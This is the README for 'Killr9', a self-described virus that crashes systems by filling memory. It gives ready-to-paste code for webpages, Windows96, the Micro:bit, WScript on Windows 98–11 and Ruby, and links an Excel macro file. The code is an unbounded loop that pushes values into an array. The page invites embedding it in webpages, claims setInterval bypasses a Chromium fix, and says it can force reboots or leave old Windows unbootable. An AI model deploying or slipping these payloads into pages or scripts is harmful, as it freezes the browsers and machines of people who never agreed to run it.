# Killr9
A virus that will kill virtually anything! We have it available in HTML, JavaScript, Python, MakeCode, TypeScript, Godot, and more!

## Killing Webpages - Inline Script
Paste the JS code inside of a script tag.
```html
<script>
    function ohSnap() {
        var corruptable=[]
        for(var i=0;i<(9999999*999999999999999999999);i++) {
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
        }
    }
    
    setInterval(ohSnap) // required to bypass a fix in newer Chromium versions
</script>
```


## Killing a Windows96 instance(WRT Bin)
Create a WRT bin, like this:
```js
//!wrt
function ohSnap() {
    var corruptable=[]
    for(var i=0;i<(9999999*999999999999999999999);i++) {
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
    }
}

setInterval(ohSnap);
```

Executing any WRT binary on Windows 96 with this code will cause the tab to lag and crash.

## Killing the BBC Micro:bit (MakeCode Editor)
Open the makecode editor at https://makecode.microbit.org/, create a project, and paste the typescript in:
```ts
function ohSnap () {
    for (let i = 0; i <= (9999999 * 999999999999999999999) - 1; i++) {
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
    }
}
let corruptable: number[] = []
corruptable = []
ohSnap()
```

Flashing this code onto your Micro:bit will cause the RAM to become completely full. This will also cause in error when being ran in the simulator, and in rare instances may completely crash it.

## Killing Windows 98 - Windows 11 (WScript)
Create a new `.js` file with the following contents:
```js
function ohSnap() {
    var corruptable=[]
    if(!corruptable.push) {
        corruptable.push=function(e){
            corruptable[corruptable.length]=e;
            corruptable.length++
        }
    }
    for(var i=0;i<(9999999*999999999999999999999);i++) {
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
    }
}

ohSnap()
```

Running this script with WSCRIPT.EXE will not cause immediate system death, but will fill up the RAM and cause the system to lag. Eventually, a force reboot will be required.
In some cases, running this on old versions of Windows may cause the system to not be able to boot up again.

## Embedding in Ruby Programs
Create a new `.rb` file with the following contents:
```ruby
def oh_snap
  corruptable = []
  (0..9999999*999999999999999999999).each do |i|
    11.times { corruptable << i }
  end
end

oh_snap
```

## Killing Microsoft Excel
Download [MSExcel.xlsm](/src/MSExcel.xlsm) and open it in Excel. The macros will do something to it. It may not even get past the splash page.
